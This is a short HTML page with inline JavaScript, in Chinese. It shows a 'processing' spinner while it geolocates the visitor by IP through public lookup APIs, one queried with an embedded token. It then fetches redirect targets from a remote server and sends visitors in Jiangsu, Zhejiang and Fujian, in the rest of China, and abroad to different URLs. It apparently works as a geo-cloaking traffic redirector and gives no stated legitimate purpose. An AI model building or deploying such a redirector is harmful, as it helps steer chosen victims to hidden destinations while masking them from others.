<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>正在处理中…</title>

<style>
  body{margin:0;padding:0;height:100vh;background:#06080d;color:#e9faff;
    font-family:'PingFang SC','Microsoft YaHei',sans-serif;display:flex;
    justify-content:center;align-items:center;text-align:center;}
  .x1{padding:32px 26px;width:92%;max-width:420px;border-radius:18px;
    background:rgba(255,255,255,0.06);backdrop-filter:blur(16px);
    border:1px solid rgba(255,255,255,0.1);}
  h2{margin:0;font-size:20px;}
  .t0{font-size:14px;color:#b8e6f5;margin:10px 0 18px;}
  .l0{width:42px;height:42px;margin:14px auto;border-radius:50%;
    border:3px solid rgba(0,255,255,0.15);border-top-color:#00f0ff;
    animation:r1 1s linear infinite;}
  @keyframes r1{to{transform:rotate(360deg);}}
  .b0{display:inline-block;padding:6px 12px;margin:4px;border-radius:99px;
    border:1px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.06);
    font-size:12px;}
  .e0{margin-top:14px;color:#ff9e9e;font-size:13px;display:none;}
</style>
</head>

<body>
<div class="x1">
  <h2 id="a1">处理中…</h2>
  <div class="t0" id="a2">正在为您搜集信息</div>
  <div class="l0"></div>

  <div class="b0" id="p1">IP: -</div>
  <div class="b0" id="p2">国家: -</div>
  <div class="b0" id="p3">区域: -</div>

  <div id="m1" class="e0"></div>
</div>

<script>
/* ========== 配置 ========== */
const XU = "https://re.xlddd.top/do?password=cache";

const IPX = [
  "https://api.ip.sb/geoip",
  "https://ipapi.co/json/",
  "https://ipinfo.io/json?token=5653ebc5afc7eb"
];

/* ========== 工具 ========== */
async function fx(u,t=3500){
  const c=new AbortController();const s=setTimeout(()=>c.abort(),t);
  try{let r=await fetch(u,{signal:c.signal});let h=await r.text();
      try{return JSON.parse(h);}catch{return r.json();}}
  catch(e){return null;}finally{clearTimeout(s);}
}

function gs(z){
  if(!z)return"";let s=String(z).toLowerCase()
    .replace(/省|市|自治区|特别行政区|province|region|state/gi,"").trim();
  const m={"jiangsu":"江苏","江苏":"江苏","fujian":"福建","福建":"福建","zhejiang":"浙江","浙江":"浙江"};
  if(m[s])return m[s];
  for(let k in m){if(s.includes(k))return m[k];}
  return s;
}

function gc(v){
  if(!v)return false;
  v=String(v).toLowerCase();
  return ["cn","china","中国","chn"].includes(v);
}

/* ========== 获取访问者信息 ========== */
async function ipf(){
  for(let q of IPX){
    let d = await fx(q,3200);
    if(!d) continue;
    return {
      a: d.ip||d.ip_address||d.data?.ip||"-",
      b: d.country||d.country_name||d.data?.country||"",
      c: d.region||d.regionName||d.province||d.data?.region||""
    };
  }
  return {a:"-",b:"-",c:"-"};
}

/* ========== 域名加载（带缓存） ========== */
async function dmf(){
  if(!XU) return null;
  let c=localStorage.getItem("_d0");
  let t=localStorage.getItem("_d1");
  if(c && t && Date.now()-t<5*60*1000){
    try{return JSON.parse(c);}catch{}
  }
  let r=await fx(XU,4000);
  if(r){
    localStorage.setItem("_d0",JSON.stringify(r));
    localStorage.setItem("_d1",Date.now());
  }
  return r;
}

/* ========== 匹配跳转线路 ========== */
function pick(i,d){
  if(!d) return null;
  if(!gc(i.b)) return d.jump3;
  let p = gs(i.c);
  if(["江苏","浙江","福建"].includes(p)) return d.jump1;
  return d.jump2;
}

/* ========== 主流程 ========== */
(async function(){
  let a1=document.getElementById("a1"),
      a2=document.getElementById("a2"),
      p1=document.getElementById("p1"),
      p2=document.getElementById("p2"),
      p3=document.getElementById("p3"),
      m1=document.getElementById("m1");

  let ip = await ipf();
  p1.textContent="IP: "+ip.a;
  p2.textContent="国家: "+ip.b;
  p3.textContent="区域: "+ip.c;

  let dm = await dmf();
  let tg = pick(ip,dm);

  if(tg){
    let s=3;
    a2.textContent=s+" 秒后为您跳转…";
    let tm=setInterval(()=>{
      s--;
      if(s>0){a2.textContent=s+" 秒后为您跳转…";}
      else{clearInterval(tm);location.href=tg;}
    },1000);
  }else{
    if(XU){
      m1.style.display="block";
      m1.textContent="无法匹配线路";
    }else{
      a2.textContent="无跳转配置，仅展示信息";
    }
  }
})();
</script>
</body>
</html>
